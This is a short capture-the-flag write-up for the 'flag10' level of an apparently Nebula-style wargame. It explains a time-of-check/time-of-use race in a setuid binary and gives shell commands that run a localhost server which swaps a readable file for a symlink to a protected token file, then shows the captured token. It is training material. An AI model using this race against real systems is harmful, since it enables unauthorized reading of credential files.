# flag10

This one was fun.

The premise is having a binary that checks for a file, then connects to a server, and sends the file over.

Did you catch it? It's a race condition.

The binary first checks if we have the right to read the file, then awaits a connection, and then sends it. We can use this connecting delay to swap the file with a symlink to the token file, allowing us to catch it at the other end.

For this, we use a simple server that listens on port 6969 (nice), and when it sees the connection is about to be made, swaps our readable file with a token symlink. This is way more reliable than spamming file swaps in a loop hoping to find the right timing.

We can launch the server like so:

```bash
cd /run/shm
vi server.c
# ...
cc server.c -o server-lv10
# ./server    <bogus-file>   <actual-token-file>
./server-lv10 /tmp/token.txt $HOME/token > result 2>&1 &

# Then we can launch the binary and reap the rewards
cd
./level10 /tmp/token.txt 127.0.0.1 
```

Result:
```
$ cat /run/shm/result
Listening (127.0.0.1:6969)...
Something happened, swapping...
Accepting...
.*( )*.
<token>
```

We can now use the token to login to the `flag10` user and get the flag.
